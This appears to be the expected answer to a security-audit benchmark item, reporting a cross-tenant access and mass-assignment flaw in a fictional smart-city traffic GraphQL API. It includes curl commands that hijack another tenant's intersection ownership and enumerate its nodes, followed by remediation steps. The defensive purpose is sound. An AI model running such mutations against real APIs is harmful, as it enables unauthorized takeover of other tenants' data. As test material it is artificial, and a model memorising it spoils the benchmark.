# Expected Response

## System
- Domain: Smart City / Traffic Management
- System: MetroPulse Traffic Orchestration
- Example ID: GQL-0054

## Priority Findings

### Finding 1: Cross-Tenant Traffic Node Write + Mass Assignment via updateIntersection — ownerId and tenantId Writable (Pattern 1.12)
**Severity:** Critical
**Category:** BOLA / Mass Assignment via Object Fields

**Summary:**
The `updateIntersection` mutation on `POST /graphql` accepts `ownerId` (and potentially `tenantId`) as writable input fields. An attacker from `tenant-ba76` targeted traffic intersection node `I-2054` (belonging to `tenant-0da5`), injecting `status: "approved"` and `ownerId: "attacker-ba760da5"`. Per §5.0 (Pattern 1.12): "The mutation `updateIntersection` accepts `ownerId` and `tenantId` as writable fields in the input, allowing mass assignment of ownership attributes." In smart city traffic management, writing `approved` status to cross-tenant intersection nodes could interfere with traffic signal control systems.

**Evidence from HAR:**
- Request: `POST https://api.metropulse-traffic-o.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-ba76` — attacker's identity
- Mutation payload: `updateIntersection(id: "I-2054", input: {status: "approved", ownerId: "attacker-ba760da5"})` — cross-tenant node write + mass assignment
- Response HTTP status: `200 OK`
- Response `tenantId`: `tenant-0da5`
- Response `ownerId`: `other-user-ba760da5`
- Response `sensitiveField`: `CONFIDENTIAL-ba760da5`
- Response `internalNotes`: `Internal data exposed`
- `x-request-id`: `req-ba760da5`

**Root Cause (§4.0 RISK-GQL-054 + §5.0):** "`updateIntersection` accepts `ownerId` and `tenantId` as writable fields — mass assignment of ownership attributes." Resolver fetches by `nodeId` without tenant guard.

**Evidence Map:**
| Artifact | Location | Detail |
|---|---|---|
| context.txt §4.0 | RISK-GQL-054 | "resolver does NOT verify tenantId against JWT's tenantId" |
| context.txt §5.0 | Pattern 1.12 | "updateIntersection accepts `ownerId` and `tenantId` as writable fields — mass assignment" |
| HAR entry | request.postData | `updateIntersection(id: "I-2054", input: {status: "approved", ownerId: "attacker-ba760da5"})` |
| HAR entry | response.content | `tenantId: "tenant-0da5"`, `200 OK` |

---

## Steps to Reproduce

### Step 1 — Cross-tenant traffic node write + mass assignment (HAR attack)
```bash
curl -s -X POST https://api.metropulse-traffic-o.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-ba76" \
  -d '{"query": "mutation { updateIntersection(id: \"I-2054\", input: {status: \"approved\", ownerId: \"attacker-ba760da5\"}) { nodeId status tenantId } }"}'
```
**Vulnerable outcome:** `200 OK`, `I-2054` (tenant-0da5) updated; `ownerId` hijacked to `attacker-ba760da5`.
**Secure outcome:** FORBIDDEN.

### Step 2 — Tenant escalation via tenantId mass assignment
```bash
curl -s -X POST https://api.metropulse-traffic-o.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-ba76" \
  -d '{"query": "mutation { updateIntersection(id: \"I-2054\", input: {tenantId: \"tenant-ba76\", ownerId: \"attacker-ba760da5\"}) { nodeId tenantId } }"}'
```
**Vulnerable outcome:** If `tenantId` is writable, node I-2054 is re-assigned to `tenant-ba76` — full ownership takeover via mass assignment.
**Secure outcome:** `tenantId` is a server-side field; client-supplied value rejected.

### Step 3 — Bulk cross-tenant node enumeration
```bash
curl -s -X POST https://api.metropulse-traffic-o.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-ba76" \
  -d '{"query": "mutation { bulkIntersectionLookup(ids: [\"I-2054\", \"I-0da5-002\"]) { nodeId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns traffic nodes from `tenant-0da5`.

## Remediation
1. **Resolver tenant guard on updateIntersection:** `WHERE node_id = $id AND tenant_id = $jwt.tenantId`.
2. **Remove ownerId and tenantId from IntersectionInput:** These must never be client-settable — derive from server context.
3. **Per-ID ownership filter in bulkIntersectionLookup.**
4. **Redis cache key includes tenantId:** §2.0 caches by `nodeId` only.
